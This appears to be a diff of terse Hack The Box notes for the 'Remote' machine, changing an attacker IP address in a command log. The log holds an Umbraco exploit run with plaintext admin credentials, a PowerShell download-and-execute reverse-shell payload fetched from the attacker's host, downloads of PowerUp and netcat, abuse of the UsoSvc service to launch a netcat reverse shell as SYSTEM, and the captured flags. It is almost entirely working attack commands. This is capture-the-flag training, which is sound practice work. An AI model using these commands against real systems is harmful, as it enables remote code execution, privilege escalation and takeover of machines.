@@ -23,15 +23,16 @@ $ msfconsole
 	> set LHOST 10.10.15.69
 	> set ExitOnSession false
 	> exploit -j
-$ ./umbraco_cve.py -u admin@htb.local -p baconandcheese -i 'http://remote.htb' -c powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.69/mini-reverse.ps1')"
+$ ./umbraco_cve.py -u admin@htb.local -p baconandcheese -i 'http://remote.htb' -c powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.244/mini-reverse.ps1')"
 
 PS C:\users\Public> type user.txt
 e1f59fd6e3d84a858994692447bf9bf3
 
-> invoke-webrequest -Uri http://10.10.15.69/PowerUp.ps1 -OutFile powerup.ps1
-> invoke-webrequest -Uri http://10.10.15.69/nc64.exe -OutFile c:\temp\nc64.exe
-> Invoke-ServiceAbuse -Name 'UsoSvc' -Command "c:\temp\nc64.exe -e cmd.exe 10.10.15.69 2222"
-> c:\temp\nc64.exe -e cmd.exe 10.10.15.69 1111
+> invoke-webrequest -Uri http://10.10.15.244/PowerUp.ps1 -OutFile powerup.ps1
+> Import-Module powerup.ps1
+> invoke-webrequest -Uri http://10.10.15.244/nc64.exe -OutFile c:\temp\nc64.exe
+> Invoke-ServiceAbuse -Name 'UsoSvc' -Command "c:\temp\nc64.exe -e cmd.exe 10.10.15.244 2222"
+> c:\temp\nc64.exe -e cmd.exe 10.10.15.244 1111
 > C:\Windows\system32>type c:\users\administrator\desktop\root.txt
 	type c:\users\administrator\desktop\root.txt
 	b3dc8337598f5b3051230d4985051f05
